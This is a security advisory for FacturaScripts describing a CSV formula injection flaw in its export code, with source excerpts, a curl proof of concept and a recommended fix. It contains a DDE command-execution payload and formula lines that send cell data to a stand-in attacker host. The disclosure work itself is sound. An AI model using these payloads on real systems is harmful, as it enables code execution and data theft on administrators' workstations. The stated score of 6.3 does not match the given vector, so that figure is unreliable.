# [H] FacturaScripts: CSV formula injection in CSVExport allows authenticated low-priv users to plant payloads that execute when an admin opens the export

## Summary
Severity: High
Advisory: GHSA-2p5x-4jr6-x5jg
CVE: CVE-2026-45263
CWE: CWE-1236
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-14
Source: https://github.com/advisories/GHSA-2p5x-4jr6-x5jg
Type: github-advisory

## Affected
- Packagist: `facturascripts/facturascripts` — affected >=0

## Details
## Summary

> **Live PoC verified 2026-04-30** against a stock FacturaScripts master at `127.0.0.1:8081`. A low-privilege user (`lowpriv`) created a customer with `nombre = "=SUM(1+1)*cmd|/c calc!A1"`. An admin then exported `ListCliente` to CSV via `?action=export&option=CSV`. The downloaded file contains the raw payload as the first cell of the `nombre` column, with no leading single quote and no escape. Excel and LibreOffice will execute the formula on open, including DDE invocations such as `=cmd|'/c calc'!A1` that spawn arbitrary processes on the admin workstation.

`Core/Lib/Export/CSVExport.php::writeData()` wraps every cell in the configured delimiter (`"`) and concatenates without inspecting the first character of the value. Spreadsheet applications interpret a cell that starts with `=`, `+`, `-`, `@`, `\t`, or `\r` as a formula. Because FacturaScripts only sanitises HTML metacharacters (`< > " '`) on save via `Tools::noHtml()` (`Core/Tools.php:45`), the formula prefix characters survive untouched all the way to the export. The downstream consumer is the admin who triggered the export, giving the attacker a reliable handoff: low-priv user plants a payload in any text field that ships in the default list export, admin downloads the CSV (all normal billing/sales/purchasing workflow), and the admin's spreadsheet client runs the formula in the admin's local context.

## Details

### the export does not neutralise leading meta-characters

`Core/Lib/Export/CSVExport.php:253-267`:

```php
public function writeData(array $data, array $fields = [])
{
    if (!empty($fields)) {
        $this->writeHeader($fields);
    }

    foreach ($data as $row) {
        $line = [];
        foreach ($row as $cell) {
            $line[] = is_string($cell) ? $this->getDelimiter() . $cell . $this->getDelimiter() : $cell;
        }

        $this->csv[] = implode($this->separator, $line);
    }
}
```

A string cell is rendered as `"<value>"`. There is no `str_starts_with(...)` check for the formula trigger characters (`= + - @ \t \r` per OWASP CSV-injection guidance) and no leading single-quote guard that Excel and LibreOffice both treat as "force as text". The same writer is reused for every list and document export through `addListModelPage()`, `addModelPage()`, `addBusinessDocPage()`, and `addTablePage()`.

### the upstream sanitiser only scrubs HTML, not formulas

`Core/Tools.php:45-46`:

```php
const HTML_CHARS = ['<', '>', '"', "'"];
const HTML_REPLACEMENTS = ['&lt;', '&gt;', '&quot;', '&#39;'];
```

`Tools::noHtml()` is the canonical input filter that models call from their `test()` method (e.g. `Cliente::test()` at `Core/Model/Cliente.php:319-321`). It strips angle brackets and quotes, none of which collide with the formula-injection alphabet. As a result, the `=`, `+`, `-`, `@` characters reach storage verbatim and the export pipeline emits them verbatim.

### the export controller hands the payload back to whoever triggers it

`Core/Lib/Export/CSVExport.php:240-245`:

```php
public function show(Response &$response)
{
    $response->headers->set('Content-Type', 'text/csv; charset=utf-8');
    $response->headers->set('Content-Disposition', 'attachment; filename=' . $this->getFileName() . '.csv');
    $response->setContent($this->getDoc());
}
```

`Content-Disposition: attachment` plus an `.csv` extension causes browsers to save the file. Double-clicking the downloaded file opens it in Excel/LibreOffice/Numbers, which honour formula execution by default. The attacker payload runs on the admin's machine with the admin's privileges, in a security context entirely outside the FacturaScripts blast radius.

### default permission model exposes the data ingestion

A user role only needs `Update`/`Insert` access to one of the default exportable models (`Cliente`, `Proveedor`, `Producto`, `Variante`, `Contacto`, etc.) to plant a payload. The admin export surface is reachable on the same controllers via `?action=export&option=CSV`. There is no separate confirmation step that warns the admin the export contains untrusted content.

## PoC

```bash
# 0. Setup: create a low-privilege user with role granting access to ListCliente/EditCliente.
#    (script in advisory environment, see also the prompt's helper).

# 1. Log in as the low-privilege user and obtain a CSRF token.
TOKEN=$(curl -s -c /tmp/fs-low-cookie 'http://127.0.0.1:8081/login' \
  | grep -oP 'name="multireqtoken" value="\K[^"]+' | head -1)
curl -s -b /tmp/fs-low-cookie -c /tmp/fs-low-cookie \
  --data-urlencode "fsNick=lowpriv" \
  --data-urlencode "fsPassword=lowpriv1234" \
  --data-urlencode "multireqtoken=$TOKEN" \
  --data-urlencode "action=login" \
  http://127.0.0.1:8081/login -o /dev/null

# 2. Get a fresh CSRF token for the EditCliente form.
TOKEN=$(curl -s -b /tmp/fs-low-cookie http://127.0.0.1:8081/EditCliente \
  | grep -oP 'multireqtoken" value="\K[^"]+' | head -1)

# 3. Plant a Dynamic Data Exchange payload as the customer name.
curl -s -b /tmp/fs-low-cookie -X POST http://127.0.0.1:8081/EditCliente \
  --data-urlencode "multireqtoken=$TOKEN" \
  --data-urlencode "action=insert" \
  --data-urlencode 'nombre==SUM(1+1)*cmd|/c calc!A1' \
  --data-urlencode "cifnif=11111111H" \
  -o /dev/null

# 4. As any admin, trigger the standard list-customers CSV export.
curl -s -b /tmp/fs-cookie2 \
  'http://127.0.0.1:8081/ListCliente?action=export&option=CSV' \
  -o /tmp/export.csv

# 5. Confirm the formula payload survives unsanitised.
grep -F '=SUM(1+1)*cmd|/c calc!A1' /tmp/export.csv
# Output (verified):
# "11111111H";"";"1";"";...;"=SUM(1+1)*cmd|/c calc!A1";"";"";"";"=SUM(1+1)*cmd|/c calc!A1";...
```

Opening `/tmp/export.csv` in Microsoft Excel triggers the Dynamic Data Exchange dialog, which on a default-trusted document or after a single user click runs `cmd /c calc`. LibreOffice Calc evaluates `=SUM(1+1)*cmd|/c calc!A1` and produces the same DDE attempt. The admin sees nothing in the FacturaScripts UI to indicate that a CSV row contained a formula.

## Impact

* **Code execution on admin workstations.** The DDE/HYPERLINK payload runs in the admin's spreadsheet client outside any container, with the admin OS user's privileges. Beachhead for full host takeover.
* **Credential theft.** Common variants (`=HYPERLINK("https://attacker/?p=" & A1, "Click")`, `=WEBSERVICE("https://attacker/?p=" & A1)`) exfiltrate adjacent cell values (customer names, fiscal IDs, balances) when the admin clicks the cell.
* **Trust laundering.** Because the file came from "our own ERP" the admin has no reason to suspect the attachment, defeating the "do not run untrusted spreadsheets" hygiene that would otherwise apply.
* **Trivial preconditions.** Any user role that can create or update a customer / supplier / product / contact (the bulk of accounting and sales staff) can stage the payload. The admin export action is unchanged from default and ships in the install.

`AV:N` (the attacker only needs an authenticated browser session), `AC:L` (single POST), `PR:L` (low-privilege role), `UI:R` (admin must download and open the CSV, but this is the standard accounting workflow), `S:U` (impact contained to FacturaScripts data + admin host), `C:H I:H A:H` (full read/write/execute on the admin workstation once the DDE/macro fires). Score `6.3`.

## Recommended Fix

Neutralise formula leaders at write time inside `CSVExport::writeData()` so the export pipeline itself enforces the protection regardless of upstream sanitisation.

```php
private const FORMULA_TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

public function writeData(array $data, array $fields = [])
{
    if (!empty($fields)) {
        $this->writeHeader($fields);
    }

    foreach ($data as $row) {
        $line = [];
        foreach ($row as $cell) {
            if (is_string($cell) && $cell !== '' && in_array($cell[0], self::FORMULA_TRIGGERS, true)) {
                $cell = "'" . $cell;          // force-as-text per OWASP CSV-injection prevention
            }

            $line[] = is_string($cell)
                ? $this->getDelimiter() . str_replace($this->getDelimiter(), $this->getDelimiter() . $this->getDelimiter(), $cell) . $this->getDelimiter()
                : $cell;
        }

        $this->csv[] = implode($this->separator, $line);
    }
}
```

Apply the same neutralisation in `writeHeader()`, in `XLSExport::getCursorRawData()` (lines 226-236 - the `Tools::fixHtml` helper does not address formulas), and in any other future exporter that emits spreadsheet-loadable formats.

A regression test should:

1. Insert a customer with `nombre = '=SUM(1+1)'`.
2. Render the list to CSV via `CSVExport->writeData()`.
3. Assert the resulting line begins with `"'=SUM(1+1)"`, not `"=SUM(1+1)"`.
4. Assert `nombre` containing an embedded delimiter (`a"b`) is correctly doubled to `"a""b"`.

Defence in depth: emit `Content-Type: text/csv; charset=utf-8` plus a `Content-Disposition` filename that the operator's MUA/browser cannot trivially confuse for a trusted XLSX (e.g. always `*.csv`, never `*.xls` or `*.xlsx`), and document in `SECURITY.md` that exports must be opened with the spreadsheet's "Import Text" / "From Text/CSV" wizard until the application is upgraded.

## References
- https://github.com/NeoRazorX/facturascripts/security/advisories/GHSA-2p5x-4jr6-x5jg
- https://github.com/NeoRazorX/facturascripts
